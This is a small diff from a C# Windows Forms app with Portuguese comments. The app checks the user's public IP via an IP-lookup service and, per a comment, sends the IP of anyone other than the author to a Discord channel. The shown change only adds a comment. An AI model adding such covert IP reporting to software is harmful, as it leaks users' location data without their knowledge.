@@ -41,7 +41,7 @@ namespace WindowsFormsApp1
             var ip = await httpClient.GetStringAsync("https://api.ipify.org"); /// api ip
             if (ip.Equals(ips)) // se o ip que a api requisitou foi igual o mostrado na string entao 
             {
-                MessageBox.Show($"meu ip {ip}");
+                MessageBox.Show($"meu ip {ip}"); // aqui eu coloco pra ele mostra o meu ip , mas vc pode chamar qualquer coisa 
             }
             else // se nao ele gera uma mensagem no discord que informa o ip de quem apertou o botao 
             {
